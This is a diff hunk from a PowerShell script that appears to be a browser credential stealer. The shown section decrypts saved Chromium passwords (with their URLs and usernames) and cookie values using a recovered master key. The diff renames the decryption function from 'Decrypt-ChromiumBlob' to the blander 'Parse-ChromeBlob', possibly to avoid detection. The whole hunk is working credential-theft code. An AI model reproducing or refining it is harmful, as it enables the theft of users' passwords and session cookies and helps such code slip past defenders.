@@ -880,18 +880,20 @@ if (-not ($Browser)){
         } catch { Write-Output "[-] Key Decryption Failed"; return }
     }
 
-    # ------------------------------------------------------------------
+# ------------------------------------------------------------------
     # 4. DECRYPT EVERYTHING
     # ------------------------------------------------------------------
     $DecryptedLogins = @()
     foreach ($Entry in $BrowserData) {
-        $Pass = Decrypt-ChromiumBlob -Base64Blob $Entry.Base64EncryptedPassword -MasterKey $MasterKey
+        # Changed 'Decrypt-ChromiumBlob' to 'Parse-ChromeBlob'
+        $Pass = Parse-ChromeBlob -Base64Blob $Entry.Base64EncryptedPassword -MasterKey $MasterKey
         $DecryptedLogins += [PSCustomObject]@{ URL = $Entry.URL; User = $Entry.Username; Pass = $Pass }
     }
 
     $DecryptedCookies = @()
     foreach ($C in $CookieBlobs) {
-        $Val = Decrypt-ChromiumBlob -Base64Blob $C.Base64EncryptedValue -MasterKey $MasterKey
+        # Changed 'Decrypt-ChromiumBlob' to 'Parse-ChromeBlob'
+        $Val = Parse-ChromeBlob -Base64Blob $C.Base64EncryptedValue -MasterKey $MasterKey
         $DecryptedCookies += [PSCustomObject]@{ Host = $C.Host; Name = $C.Name; Value = $Val }
     }
 
